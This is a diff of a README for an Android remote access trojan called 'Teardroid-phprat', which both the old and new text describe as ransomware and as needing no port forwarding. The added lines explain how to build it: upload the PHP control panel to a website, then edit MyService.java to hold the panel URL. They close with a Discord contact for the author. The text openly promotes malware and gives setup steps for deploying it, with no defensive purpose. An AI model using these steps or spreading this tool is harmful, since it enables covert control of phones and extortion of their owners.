@@ -1,21 +1,11 @@
 # Teardroid-phprat
+Its easy to use android php rat which don't require port forwarding. Main function is ransomware. 
 
+# How to compile
+- Upload [control panel]("control panel) folder to any site.
+- Fork it and change MyService.java at line 58 and insert your panel link:
+`public String http = "Enter your website url here";`
+(here)[https://github.com/graysuit/Teardroid-phprat/blob/master/botnet%20apk/app/src/main/java/com/example/kico/botnet/MyService.java#L58]
 
-its easy to use android php rat the best part is no port forwarding needed also work as ransomware 
-
-# requirement:
-1.android studio
-
-2.website
-
-# version 2.0 
-
-![Screenshot](https://github.com/ScRiPt1337/Teardroid-phprat/blob/master/Capture.PNG)
-
-# how to use
-
-https://odysee.com/@Script1337:b/teardroid-phprat:3    (old version's setup tutorial)
-
-# Contact us
-
+# Contact author
 https://discord.gg/5CjQacc
